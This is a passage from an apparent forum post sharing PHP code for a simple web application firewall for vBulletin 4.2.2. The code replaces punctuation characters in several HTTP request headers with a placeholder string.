/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br />&nbsp;&nbsp;}<br /></span><span style="color: #0000BB">?&gt;</span>
</span>
</code></code></div>
</div>Note: If you want use this WAF on other CMS you must change white list and include it on cms config file (config files usually included on all files in CMS that’s why we do that).<br />
<br />
Here is a more powerful WAF made for VBulletin 4.2.2: <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:372px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br /></span><span style="color: #FF8000">//Code&nbsp;By&nbsp;Ali&nbsp;Razmjoo<br />//waf2.php<br />//https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/waf2.php<br />#!@$%^&amp;*()-_+=`~&#91;&#93;\{}|;':",./&lt;&gt;?<br /></span><span style="color: #0000BB">$deny&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'#'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'!'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'@'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'$'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'%'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'^'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&amp;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'*'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'('</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">')'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'-'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'_'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'+'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'='</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'`'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'~'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#91;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#93;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\\'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'{'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'}'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'|'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">';'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\''</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">':'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">','</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'.'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'/'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&lt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&gt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'?'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$denytoken&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'#'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'!'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'@'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'$'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'%'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'^'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&amp;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'*'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'('</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">')'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'_'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'+'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'='</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'`'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'~'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#91;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#93;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\\'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'{'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'}'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'|'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">';'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\''</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">':'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">','</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'.'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'/'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&lt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&gt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'?'</span><span style="color: #007700">);<br /><br /></span><span style="color: #0000BB">$denymail&nbsp;</span><span style="color: #007700">=&nbsp;array(</span><span style="color: #DD0000">'#'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'!'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'$'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'%'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'^'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&amp;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'*'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'('</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">')'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'+'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'='</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'`'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'~'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#91;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&#93;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\\'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'{'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'}'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'|'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">';'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'\''</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">':'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'"'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">','</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'/'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&lt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'&gt;'</span><span style="color: #007700">,<br /></span><span style="color: #DD0000">'?'</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$agent_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">"/"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"."&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"("&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">")"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">";"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"+"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">":"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"_"&nbsp;</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"-"</span><span style="color: #007700">));<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_USER_AGENT"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$agent_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_USER_AGENT"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$agent_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_USER_AGENT"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_REFERER"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_REFERER"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_REFERER"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_LANGUAGE"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_LANGUAGE"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_LANGUAGE"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_ACCEPT_ENCODING"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /><br /></span><span style="color: #0000BB">$cookie_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">";"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">"_"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">,</span><span style="color: #DD0000">"="</span><span style="color: #007700">,</span><span style="color: #DD0000">"-"</span><span style="color: #007700">,</span><span style="color: #DD0000">","</span><span style="color: #007700">,</span><span style="color: #DD0000">"/"</span><span style="color: #007700">,</span><span style="color: #DD0000">":"</span><span style="color: #007700">));<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$cookie_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_COOKIE"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$cookie_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_COOKIE"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$cookie_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_COOKIE"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$cache_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">"-"</span><span style="color: #007700">));<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_PRAGMA"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_PRAGMA"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_PRAGMA"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_CACHE_CONTROL"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_CACHE_CONTROL"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$cache_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">"*F*"</span><span style="color: #007700">,</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"HTTP_CACHE_CONTROL"</span><span style="color: #007700">&#93;);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br /><br /></span><span style="color: #0000BB">$req_deny&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">array_diff</span><span style="color: #007700">(</span><span style="color: #0000BB">$deny</span><span style="color: #007700">,&nbsp;array(</span><span style="color: #DD0000">"/"</span><span style="color: #007700">,</span><span style="color: #DD0000">"."</span><span style="color: #007700">));<br />for(</span><span style="color: #0000BB">$i</span><span style="color: #007700">=</span><span style="color: #0000BB">0</span><span style="color: #007700">;&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">count</span><span style="color: #007700">(</span><span style="color: #0000BB">$req_deny</span><span style="color: #007700">);&nbsp;</span><span style="color: #0000BB">$i</span><span style="color: #007700">++){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">strpos</span><span style="color: #007700">(</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"SERVER_PROTOCOL"</span><span style="color: #007700">&#93;,</span><span style="color: #0000BB">$req_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;)&nbsp;!==&nbsp;</span><span style="color: #0000BB">false</span><span style="color: #007700">){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">$_SERVER</span><span style="color: #007700">&#91;</span><span style="color: #DD0000">"SERVER_PROTOCOL"</span><span style="color: #007700">&#93;&nbsp;=&nbsp;</span><span style="color: #0000BB">str_replace</span><span style="color: #007700">(</span><span style="color: #0000BB">$req_deny</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">$i</span><span style="color: #007700">&#93;,</span><span style="color: 